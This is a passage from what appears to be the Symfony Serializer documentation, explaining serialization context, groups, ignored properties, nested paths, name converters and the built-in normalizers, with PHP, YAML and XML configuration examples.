    // src/Model/Person.php\n\n        // ...\n        use Symfony\\Component\\Serializer\\Attribute\\Context;\n        use Symfony\\Component\\Serializer\\Normalizer\\DateTimeNormalizer;\n\n        class Person\n        {\n            #[Context(\n                normalizationContext: [DateTimeNormalizer::FORMAT_KEY => 'Y-m-d'],\n                denormalizationContext: [DateTimeNormalizer::FORMAT_KEY => \\DateTime::RFC3339],\n            )]\n            public \\DateTimeImmutable $createdAt;\n\n            // ...\n        }\n\n    .. code-block:: yaml\n\n        # config/serializer/person.yaml\n        App\\Model\\Person:\n            attributes:\n                createdAt:\n                    contexts:\n                        - normalizationContext: { datetime_format: 'Y-m-d' }\n                          denormalizationContext: { datetime_format: !php/const \\DateTime::RFC3339 }\n\n    .. code-block:: xml\n\n        <!-- config/serializer/person.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <serializer xmlns=\"http://symfony.com/schema/dic/serializer-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/serializer-mapping\n                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd\"\n        >\n            <class name=\"App\\Model\\Person\">\n                <attribute name=\"createdAt\">\n                    <normalization-context>\n                        <entry name=\"datetime_format\">Y-m-d</entry>\n                    </normalization-context>\n\n                    <denormalization-context>\n                        <entry name=\"datetime_format\">Y-m-d\\TH:i:sP</entry>\n                    </denormalization-context>\n                </attribute>\n            </class>\n        </serializer>\n\n.. _serializer-context-group:\n\nYou can also restrict the usage of a context to some\n:ref:`groups <serializer-groups-attribute>`:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Model/Person.php\n\n        // ...\n        use Symfony\\Component\\Serializer\\Attribute\\Context;\n        use Symfony\\Component\\Serializer\\Attribute\\Groups;\n        use Symfony\\Component\\Serializer\\Normalizer\\DateTimeNormalizer;\n\n        class Person\n        {\n            #[Groups(['extended'])]\n            #[Context([DateTimeNormalizer::FORMAT_KEY => \\DateTime::RFC3339])]\n            #[Context(\n                context: [DateTimeNormalizer::FORMAT_KEY => \\DateTime::RFC3339_EXTENDED],\n                groups: ['extended'],\n            )]\n            public \\DateTimeImmutable $createdAt;\n\n            // ...\n        }\n\n    .. code-block:: yaml\n\n        # config/serializer/person.yaml\n        App\\Model\\Person:\n            attributes:\n                createdAt:\n                    groups: [extended]\n                    contexts:\n                        - context: { datetime_format: !php/const \\DateTime::RFC3339 }\n                        - context: { datetime_format: !php/const \\DateTime::RFC3339_EXTENDED }\n                          groups: [extended]\n\n    .. code-block:: xml\n\n        <!-- config/serializer/person.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <serializer xmlns=\"http://symfony.com/schema/dic/serializer-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/serializer-mapping\n                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd\"\n        >\n            <class name=\"App\\Model\\Person\">\n                <attribute name=\"createdAt\">\n                    <group>extended</group>\n\n                    <context>\n                        <entry name=\"datetime_format\">Y-m-d\\TH:i:sP</entry>\n                    </context>\n                    <context>\n                        <entry name=\"datetime_format\">Y-m-d\\TH:i:s.vP</entry>\n                        <group>extended</group>\n                    </context>\n                </attribute>\n            </class>\n        </serializer>\n\nThe attribute can be repeated as much as needed on a single property.\nContext without group is always applied first. Then context for the\nmatching groups are merged in the provided order.\n\nIf you repeat the same context in multiple properties, consider using the\n``#[Context]`` attribute on your class to apply that context configuration to\nall the properties of the class::\n\n    namespace App\\Model;\n\n    use Symfony\\Component\\Serializer\\Attribute\\Context;\n    use Symfony\\Component\\Serializer\\Normalizer\\DateTimeNormalizer;\n\n    #[Context([DateTimeNormalizer::FORMAT_KEY => \\DateTime::RFC3339])]\n    #[Context(\n        context: [DateTimeNormalizer::FORMAT_KEY => \\DateTime::RFC3339_EXTENDED],\n        groups: ['extended'],\n    )]\n    class Person\n    {\n        // ...\n    }\n\nSerializing to or from PHP Arrays\n---------------------------------\n\nThe default :class:`Symfony\\\\Component\\\\Serializer\\\\Serializer` can also be\nused to only perform one step of the :ref:`two step serialization process <serializer-process>`\nby using the respective interface:\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        use Symfony\\Component\\Serializer\\Encoder\\DecoderInterface;\n        use Symfony\\Component\\Serializer\\Encoder\\EncoderInterface;\n        use Symfony\\Component\\Serializer\\Normalizer\\DenormalizerInterface;\n        use Symfony\\Component\\Serializer\\Normalizer\\NormalizerInterface;\n        // ...\n\n        class PersonController extends AbstractController\n        {\n            public function index(DenormalizerInterface&NormalizerInterface $serializer): Response\n            {\n                $person = new Person('Jane Doe', 39, false);\n\n                // use normalize() to convert a PHP object to an array\n                $personArray = $serializer->normalize($person, 'json');\n\n                // ...and denormalize() to convert an array back to a PHP object\n                $personCopy = $serializer->denormalize($personArray, Person::class);\n\n                // ...\n            }\n\n            public function json(DecoderInterface&EncoderInterface $serializer): Response\n            {\n                $data = ['name' => 'Jane Doe'];\n\n                // use encode() to transform PHP arrays into another format\n                $json = $serializer->encode($data, 'json');\n\n                // ...and decode() to transform any format to just PHP arrays (instead of objects)\n                $data = $serializer->decode('{\"name\":\"Charlie Doe\"}', 'json');\n                // $data contains ['name' => 'Charlie Doe']\n            }\n        }\n\n    .. code-block:: php-standalone\n\n        use App\\Model\\Person;\n        use Symfony\\Component\\Serializer\\Encoder\\JsonEncoder;\n        use Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer;\n        use Symfony\\Component\\Serializer\\Serializer;\n\n        $encoders = [new JsonEncoder()];\n        $normalizers = [new ObjectNormalizer()];\n        $serializer = new Serializer($normalizers, $encoders);\n\n        // use normalize() to convert a PHP object to an array\n        $personArray = $serializer->normalize($person, 'json');\n\n        // ...and denormalize() to convert an array back to a PHP object\n        $personCopy = $serializer->denormalize($personArray, Person::class);\n\n        $data = ['name' => 'Jane Doe'];\n\n        // use encode() to transform PHP arrays into another format\n        $json = $serializer->encode($data, 'json');\n\n        // ...and decode() to transform any format to just PHP arrays (instead of objects)\n        $data = $serializer->decode('{\"name\":\"Charlie Doe\"}', 'json');\n        // $data contains ['name' => 'Charlie Doe']\n\n.. _serializer_ignoring-attributes:\n\nIgnoring Properties\n-------------------\n\nThe ``ObjectNormalizer`` normalizes *all* properties of an object and all\nmethods starting with ``get*()``, ``has*()``, ``is*()`` and ``can*()``.\nSome properties or methods should never be serialized. You can exclude\nthem using the ``#[Ignore]`` attribute:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Model/Person.php\n        namespace App\\Model;\n\n        use Symfony\\Component\\Serializer\\Attribute\\Ignore;\n\n        class Person\n        {\n            // ...\n\n            #[Ignore]\n            public function isPotentiallySpamUser(): bool\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        App\\Model\\Person:\n            attributes:\n                potentiallySpamUser:\n                    ignore: true\n\n    .. code-block:: xml\n\n        <?xml version=\"1.0\" ?>\n        <serializer xmlns=\"http://symfony.com/schema/dic/serializer-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/serializer-mapping\n                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd\"\n        >\n            <class name=\"App\\Model\\Person\">\n                <attribute name=\"potentiallySpamUser\" ignore=\"true\"/>\n            </class>\n        </serializer>\n\nThe ``potentiallySpamUser`` property will now never be serialized:\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        use App\\Model\\Person;\n\n        // ...\n        $person = new Person('Jane Doe', 32, false);\n        $json = $serializer->serialize($person, 'json');\n        // $json contains {\"name\":\"Jane Doe\",\"age\":32,\"sportsperson\":false}\n\n        $person1 = $serializer->deserialize(\n            '{\"name\":\"Jane Doe\",\"age\":32,\"sportsperson\":false\",\"potentiallySpamUser\":false}',\n            Person::class,\n            'json'\n        );\n        // the \"potentiallySpamUser\" value is ignored\n\n    .. code-block:: php-standalone\n\n        use App\\Model\\Person;\n        use Symfony\\Component\\Serializer\\Mapping\\Factory\\ClassMetadataFactory;\n        use Symfony\\Component\\Serializer\\Mapping\\Loader\\AttributeLoader;\n        use Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer;\n        use Symfony\\Component\\Serializer\\Serializer;\n\n        // ...\n\n        // you need to pass a class metadata factory with a loader to the\n        // ObjectNormalizer when reading mapping information like Ignore or Groups.\n        // E.g. when using PHP attributes:\n        $classMetadataFactory = new ClassMetadataFactory(new AttributeLoader());\n        $normalizers = [new ObjectNormalizer($classMetadataFactory)];\n\n        $serializer = new Serializer($normalizers, $encoders);\n\n        $person = new Person('Jane Doe', 32, false);\n        $json = $serializer->serialize($person, 'json');\n        // $json contains {\"name\":\"Jane Doe\",\"age\":32,\"sportsperson\":false}\n\n        $person1 = $serializer->deserialize(\n            '{\"name\":\"Jane Doe\",\"age\":32,\"sportsperson\":false\",\"potentiallySpamUser\":false}',\n            Person::class,\n            'json'\n        );\n        // the \"potentiallySpamUser\" value is ignored\n\nIgnoring Attributes Using the Context\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can also pass an array of attribute names to ignore at runtime using\nthe ``ignored_attributes`` context options::\n\n    use Symfony\\Component\\Serializer\\Normalizer\\AbstractNormalizer;\n\n    // ...\n    $person = new Person('Jane Doe', 32, false);\n    $json = $serializer->serialize($person, 'json',\n    [\n        AbstractNormalizer::IGNORED_ATTRIBUTES => ['age'],\n    ]);\n    // $json contains {\"name\":\"Jane Doe\",\"sportsperson\":false}\n\nHowever, this can quickly become unmaintainable if used excessively. See\nthe next section about *serialization groups* for a better solution.\n\n.. _serializer-groups-attribute:\n\nSelecting Specific Properties\n-----------------------------\n\nInstead of excluding a property or method in all situations, you might need\nto exclude some properties in one place, but serialize them in another.\nGroups are a handy way to achieve this.\n\nYou can add the ``#[Groups]`` attribute to your class:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Model/Person.php\n        namespace App\\Model;\n\n        use Symfony\\Component\\Serializer\\Attribute\\Groups;\n\n        class Person\n        {\n            #[Groups([\"admin-view\"])]\n            private int $age;\n\n            #[Groups([\"public-view\"])]\n            private string $name;\n\n            #[Groups([\"public-view\"])]\n            private bool $sportsperson;\n\n            // ...\n        }\n\n    .. code-block:: yaml\n\n        # config/serializer/person.yaml\n        App\\Model\\Person:\n            attributes:\n                age:\n                    groups: ['admin-view']\n                name:\n                    groups: ['public-view']\n                sportsperson:\n                    groups: ['public-view']\n\n    .. code-block:: xml\n\n        <!-- config/serializer/person.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <serializer xmlns=\"http://symfony.com/schema/dic/serializer-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/serializer-mapping\n                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd\"\n        >\n            <class name=\"App\\Model\\Person\">\n                <attribute name=\"age\">\n                    <group>admin-view</group>\n                </attribute>\n                <attribute name=\"name\">\n                    <group>public-view</group>\n                </attribute>\n                <attribute name=\"sportsperson\">\n                    <group>public-view</group>\n                </attribute>\n            </class>\n        </serializer>\n\nYou can now choose which groups to use when serializing::\n\n    $json = $serializer->serialize(\n        $person,\n        'json',\n        ['groups' => 'public-view']\n    );\n    // $json contains {\"name\":\"Jane Doe\",\"sportsperson\":false}\n\n    // you can also pass an array of groups\n    $json = $serializer->serialize(\n        $person,\n        'json',\n        ['groups' => ['public-view', 'admin-view']]\n    );\n    // $json contains {\"name\":\"Jane Doe\",\"age\":32,\"sportsperson\":false}\n\n    // or use the special \"*\" value to select all groups\n    $json = $serializer->serialize(\n        $person,\n        'json',\n        ['groups' => '*']\n    );\n    // $json contains {\"name\":\"Jane Doe\",\"age\":32,\"sportsperson\":false}\n\nUsing the Serialization Context\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAt last, you can also use the ``attributes`` context option to select\nproperties at runtime::\n\n    use Symfony\\Component\\Serializer\\Normalizer\\AbstractNormalizer;\n    // ...\n\n    $json = $serializer->serialize($person, 'json', [\n        AbstractNormalizer::ATTRIBUTES => ['name', 'company' => ['name']]\n    ]);\n    // $json contains {\"name\":\"Dunglas\",\"company\":{\"name\":\"Les-Tilleuls.coop\"}}\n\nOnly attributes that are :ref:`not ignored <serializer_ignoring-attributes>`\nare available. If serialization groups are set, only attributes allowed by\nthose groups can be used.\n\n.. _serializer-handling-arrays:\n\nHandling Arrays\n---------------\n\nThe serializer is capable of handling arrays of objects. Serializing arrays\nworks just like serializing a single object::\n\n    use App\\Model\\Person;\n\n    // ...\n    $person1 = new Person('Jane Doe', 39, false);\n    $person2 = new Person('John Smith', 52, true);\n\n    $persons = [$person1, $person2];\n    $JsonContent = $serializer->serialize($persons, 'json');\n\n    // $jsonContent contains [{\"name\":\"Jane Doe\",\"age\":39,\"sportsman\":false},{\"name\":\"John Smith\",\"age\":52,\"sportsman\":true}]\n\nTo deserialize a list of objects, you have to append ``[]`` to the type\nparameter::\n\n    // ...\n\n    $jsonData = ...; // the serialized JSON data from the previous example\n    $persons = $serializer->deserialize($JsonData, Person::class.'[]', 'json');\n\nFor nested classes, you have to add a PHPDoc type to the property, constructor or setter::\n\n    // src/Model/UserGroup.php\n    namespace App\\Model;\n\n    class UserGroup\n    {\n        /**\n         * @param Person[] $members\n         */\n        public function __construct(\n            private array $members,\n        ) {\n        }\n\n        // or if you're using a setter\n\n        /**\n         * @param Person[] $members\n         */\n        public function setMembers(array $members): void\n        {\n            $this->members = $members;\n        }\n\n        // ...\n    }\n\n.. tip::\n\n    The Serializer also supports array types used in static analysis, like\n    ``list<Person>`` and ``array<Person>``. Make sure the\n    ``phpstan/phpdoc-parser`` and ``phpdocumentor/reflection-docblock``\n    packages are installed (these are part of the ``symfony/serializer-pack``).\n\n.. _serializer-nested-structures:\n\nDeserializing Nested Structures\n-------------------------------\n\nSome APIs might provide verbose nested structures that you want to flatten\nin the PHP object. For instance, imagine a JSON response like this:\n\n.. code-block:: json\n\n    {\n        \"id\": \"123\",\n        \"profile\": {\n            \"username\": \"jdoe\",\n            \"personal_information\": {\n                \"full_name\": \"Jane Doe\"\n            }\n        }\n    }\n\nYou may wish to serialize this information to a single PHP object like::\n\n    class Person\n    {\n        private int $id;\n        private string $username;\n        private string $fullName;\n    }\n\nUse the ``#[SerializedPath]`` to specify the path of the nested property\nusing :doc:`valid PropertyAccess syntax </components/property_access>`:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        namespace App\\Model;\n\n        use Symfony\\Component\\Serializer\\Attribute\\SerializedPath;\n\n        class Person\n        {\n            private int $id;\n\n            #[SerializedPath('[profile][username]')]\n            private string $username;\n\n            #[SerializedPath('[profile][personal_information][full_name]')]\n            private string $fullName;\n        }\n\n    .. code-block:: yaml\n\n        App\\Model\\Person:\n            attributes:\n                username:\n                    serialized_path: '[profile][username]'\n                fullName:\n                    serialized_path: '[profile][personal_information][full_name]'\n\n    .. code-block:: xml\n\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <serializer xmlns=\"http://symfony.com/schema/dic/serializer-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/serializer-mapping\n                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd\"\n        >\n            <class name=\"App\\Model\\Person\">\n                <attribute name=\"username\" serialized-path=\"[profile][username]\"/>\n                <attribute name=\"fullName\" serialized-path=\"[profile][personal_information][full_name]\"/>\n            </class>\n        </serializer>\n\n.. warning::\n\n    The ``SerializedPath`` cannot be used in combination with a\n    ``SerializedName`` for the same property.\n\nThe ``#[SerializedPath]`` attribute also applies to the serialization of a\nPHP object::\n\n    use App\\Model\\Person;\n    // ...\n\n    $person = new Person(123, 'jdoe', 'Jane Doe');\n    $jsonContent = $serializer->serialize($person, 'json');\n    // $jsonContent contains {\"id\":123,\"profile\":{\"username\":\"jdoe\",\"personal_information\":{\"full_name\":\"Jane Doe\"}}}\n\n.. _serializer-name-conversion:\n\nConverting Property Names when Serializing and Deserializing\n------------------------------------------------------------\n\nSometimes serialized attributes must be named differently than properties\nor getter/setter methods of PHP classes. This can be achieved using name\nconverters.\n\nThe serializer service uses the\n:class:`Symfony\\\\Component\\\\Serializer\\\\NameConverter\\\\MetadataAwareNameConverter`.\nWith this name converter, you can change the name of an attribute using\nthe ``#[SerializedName]`` attribute:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Model/Person.php\n        namespace App\\Model;\n\n        use Symfony\\Component\\Serializer\\Attribute\\SerializedName;\n\n        class Person\n        {\n            #[SerializedName('customer_name')]\n            private string $name;\n\n            // ...\n        }\n\n    .. code-block:: yaml\n\n        # config/serializer/person.yaml\n        App\\Entity\\Person:\n            attributes:\n                name:\n                    serialized_name: customer_name\n\n    .. code-block:: xml\n\n        <!-- config/serializer/person.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <serializer xmlns=\"http://symfony.com/schema/dic/serializer-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/serializer-mapping\n                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd\"\n        >\n            <class name=\"App\\Entity\\Person\">\n                <attribute name=\"name\" serialized-name=\"customer_name\"/>\n            </class>\n        </serializer>\n\nThis custom mapping is used to convert property names when serializing and\ndeserializing objects:\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        // ...\n\n        $json = $serializer->serialize($person, 'json');\n        // $json contains {\"customer_name\":\"Jane Doe\", ...}\n\n    .. code-block:: php-standalone\n\n        use App\\Model\\Person;\n        use Symfony\\Component\\Serializer\\Mapping\\Factory\\ClassMetadataFactory;\n        use Symfony\\Component\\Serializer\\Mapping\\Loader\\AttributeLoader;\n        use Symfony\\Component\\Serializer\\NameConverter\\MetadataAwareNameConverter;\n        use Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer;\n        use Symfony\\Component\\Serializer\\Serializer;\n\n        // ...\n\n        // Configure a loader to retrieve mapping information like SerializedName.\n        // E.g. when using PHP attributes:\n        $classMetadataFactory = new ClassMetadataFactory(new AttributeLoader());\n        $nameConverter = new MetadataAwareNameConverter($classMetadataFactory);\n        $normalizers = [\n            new ObjectNormalizer($classMetadataFactory, $nameConverter),\n        ];\n\n        $serializer = new Serializer($normalizers, $encoders);\n\n        $person = new Person('Jane Doe', 32, false);\n        $json = $serializer->serialize($person, 'json');\n        // $json contains {\"customer_name\":\"Jane Doe\", ...}\n\n.. seealso::\n\n    You can also create a custom name converter class. Read more about this\n    in :doc:`/serializer/custom_name_converter`.\n\n.. _using-camelized-method-names-for-underscored-attributes:\n\nCamelCase to snake_case\n~~~~~~~~~~~~~~~~~~~~~~~\n\nIn many formats, it's common to use underscores to separate words (also known\nas snake_case). However, in Symfony applications is common to use camelCase to\nname properties.\n\nSymfony provides a built-in name converter designed to transform between\nsnake_case and CamelCased styles during serialization and deserialization\nprocesses. You can use it instead of the metadata aware name converter by\nsetting the ``name_converter`` setting to\n``serializer.name_converter.camel_case_to_snake_case``:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/serializer.yaml\n        framework:\n            serializer:\n                name_converter: 'serializer.name_converter.camel_case_to_snake_case'\n\n    .. code-block:: xml\n\n        <!-- config/packages/serializer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:serializer\n                    name-converter=\"serializer.name_converter.camel_case_to_snake_case\"\n                />\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/serializer.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->serializer()\n                ->nameConverter('serializer.name_converter.camel_case_to_snake_case')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\Serializer\\NameConverter\\CamelCaseToSnakeCaseNameConverter;\n        use Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer;\n\n        // ...\n        $normalizers = [\n            new ObjectNormalizer(null, new CamelCaseToSnakeCaseNameConverter()),\n        ];\n        $serializer = new Serializer($normalizers, $encoders);\n\n.. _serializer-built-in-normalizers:\n\nSerializer Normalizers\n----------------------\n\nBy default, the serializer service is configured with the following\nnormalizers (in order of priority):\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\UnwrappingDenormalizer`\n    Can be used to only denormalize a part of the input, read more about\n    this :ref:`later in this article <serializer-unwrapping-denormalizer>`.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\ProblemNormalizer`\n    Normalizes :class:`Symfony\\\\Component\\\\ErrorHandler\\\\Exception\\\\FlattenException`\n    errors according to the API Problem spec `RFC 7807`_.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\UidNormalizer`\n    Normalizes objects that extend :class:`Symfony\\\\Component\\\\Uid\\\\AbstractUid`.\n\n    The default normalization format for objects that implement :class:`Symfony\\\\Component\\\\Uid\\\\Uuid`\n    is the `RFC 4122`_ format (example: ``d9e7a184-5d5b-11ea-a62a-3499710062d0``).\n    The default normalization format for objects that implement :class:`Symfony\\\\Component\\\\Uid\\\\Ulid`\n    is the Base 32 format (example: ``01E439TP9XJZ9RPFH3T1PYBCR8``).\n    You can change the string format by setting the serializer context option\n    ``UidNormalizer::NORMALIZATION_FORMAT_KEY`` to ``UidNormalizer::NORMALIZATION_FORMAT_BASE_58``,\n    ``UidNormalizer::NORMALIZATION_FORMAT_BASE_32`` or ``UidNormalizer::NORMALIZATION_FORMAT_RFC_4122``.\n\n    Also it can denormalize ``uuid`` or ``ulid`` strings to :class:`Symfony\\\\Component\\\\Uid\\\\Uuid`\n    or :class:`Symfony\\\\Component\\\\Uid\\\\Ulid`. The format does not matter.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\DateTimeNormalizer`\n    This normalizes between :phpclass:`DateTimeInterface` objects (e.g.\n    :phpclass:`DateTime` and :phpclass:`DateTimeImmutable`) and strings,\n    integers or floats.\n\n    :phpclass:`DateTime` and :phpclass:`DateTimeImmutable`) into strings,\n    integers or floats. By default, it converts them to strings using the\n    `RFC 3339`_ format. Use ``DateTimeNormalizer::FORMAT_KEY`` and\n    ``DateTimeNormalizer::TIMEZONE_KEY`` to change the format.\n\n    To convert the objects to integers or floats, set the serializer\n    context option ``DateTimeNormalizer::CAST_KEY`` to ``int`` or\n    ``float``.\n\n    .. versionadded:: 7.1\n\n        The ``DateTimeNormalizer::CAST_KEY`` context option was introduced in Symfony 7.1.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\ConstraintViolationListNormalizer`\n    This normalizer converts objects that implement\n    :class:`Symfony\\\\Component\\\\Validator\\\\ConstraintViolationListInterface`\n    into a list of errors according to the `RFC 7807`_ standard.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\DateTimeZoneNormalizer`\n    This normalizer converts between :phpclass:`DateTimeZone` objects and strings that\n    represent the name of the timezone according to the `list of PHP timezones`_.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\DateIntervalNormalizer`\n    This normalizes between :phpclass:`DateInterval` objects and strings.\n    By default, the ``P%yY%mM%dDT%hH%iM%sS`` format is used. Use the\n    ``DateIntervalNormalizer::FORMAT_KEY`` option to change this.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\FormErrorNormalizer`\n    This normalizer works with classes that implement\n    :class:`Symfony\\\\Component\\\\Form\\\\FormInterface`.\n\n    It will get errors from the form and normalize them according to the\n    API Problem spec `RFC 7807`_.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\TranslatableNormalizer`\n    This normalizer converts objects implementing :class:`Symfony\\\\Contracts\\\\Translation\\\\TranslatableInterface`\n    to a translated string using the :doc:`translator </translation>`.\n\n    You can define the locale to use to translate the object by setting the\n    ``TranslatableNormalizer::NORMALIZATION_LOCALE_KEY`` context option.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\BackedEnumNormalizer`\n    This normalizer converts between :phpclass:`BackedEnum` enums and\n    strings or integers.\n\n    By default, an exception is thrown when data is not a valid backed enumeration. If you\n    want ``null`` instead, you can set the ``BackedEnumNormalizer::ALLOW_INVALID_VALUES`` option.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\DataUriNormalizer`\n    This normalizer converts between :phpclass:`SplFileInfo` objects and a\n    `data URI`_ string (``data:...``) such that files can be embedded into\n    serialized data.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\JsonSerializableNormalizer`\n    This normalizer works with classes that implement :phpclass:`JsonSerializable`.\n\n    It will call the :phpmethod:`JsonSerializable::jsonSerialize` method and\n    then further normalize the result. This means that nested\n    :phpclass:`JsonSerializable` classes will also be normalized.\n\n    This normalizer is particularly helpful when you want to gradually migrate\n    from an existing codebase using simple :phpfunction:`json_encode` to the Symfony\n    Serializer by allowing you to mix which normalizers are used for which classes.\n\n    Unlike with :phpfunction:`json_encode` circular references can be handled.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\ArrayDenormalizer`\n    This denormalizer converts an array of arrays to an array of objects\n    (with the given type). See :ref:`Handling Arrays <serializer-handling-arrays>`.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\ObjectNormalizer`\n    This is the most powerful default normalizer and used for any object\n    that could not be normalized by the other normalizers.\n\n    It leverages the :doc:`PropertyAccess Component </components/property_access>`\n    to read and write in the object. This allows it to access properties\n    directly or using getters, setters, hassers, issers, canners, adders and\n    removers. Names are generated by removing the ``get``, ``set``,\n    ``has``, ``is``, ``add`` or ``remove`` prefix from the method name and\n    transforming the first letter to lowercase (e.g. ``getFirstName()`` ->\n    ``firstName``).\n\n    During denormalization, it supports using the constructor as well as\n    the discovered methods.\n\n.. danger::\n\n    Always make sure the ``DateTimeNormalizer`` is registered when\n    serializing the ``DateTime`` or ``DateTimeImmutable`` classes to avoid\n    excessive memory usage and exposing internal details.\n\nBuilt-in Normalizers\n~~~~~~~~~~~~~~~~~~~~\n\nBesides the normalizers registered by default (see previous section), the\nserializer component also provides some extra normalizers.You can register\nthese by defining a service and tag it with :ref:`serializer.normalizer <reference-dic-tags-serializer-normalizer>`.\nFor instance, to use the ``CustomNormalizer`` you have to define a service\nlike:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n\n            # if you're using autoconfigure, the tag will be automatically applied\n            Symfony\\Component\\Serializer\\Normalizer\\CustomNormalizer:\n                tags:\n                    # register the normalizer with a high priority (called earlier)\n                    - { name: 'serializer.normalizer', priority: 500 }\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- ... -->\n\n                <!-- if you're using autoconfigure, the tag will be automatically applied -->\n                <service id=\"Symfony\\Component\\Serializer\\Normalizer\\CustomNormalizer\">\n                    <!-- register the normalizer with a high priority (called earlier) -->\n                    <tag name=\"serializer.normalizer\"\n                        priority=\"500\"\n                    />\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use Symfony\\Component\\Serializer\\Normalizer\\CustomNormalizer;\n\n        return function(ContainerConfigurator $container) {\n            // ...\n\n            // if you're using autoconfigure, the tag will be automatically applied\n            $services->set(CustomNormalizer::class)\n                // register the normalizer with a high priority (called earlier)\n                ->tag('serializer.normalizer', [\n                    'priority' => 500,\n                ])\n            ;\n        };\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\CustomNormalizer`\n    This normalizer calls a method on the PHP object when normalizing. The\n    PHP object must implement :class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\NormalizableInterface`\n    and/or :class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\DenormalizableInterface`.\n\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\GetSetMethodNormalizer`\n    This normalizer is an alternative to the default ``ObjectNormalizer``.\n    It reads the content of the class by calling the \"getters\" (public\n    methods starting with ``get``, ``has``, ``is`` or ``can``). It will\n    denormalize data by calling the constructor and the \"setters\" (public\n    methods starting with ``set``).\n\n    Objects are normalized to a map of property names and values (names are\n    generated by removing the ``get`` prefix from the method name and transforming\n    the first letter to lowercase; e.g. ``getFirstName()`` -> 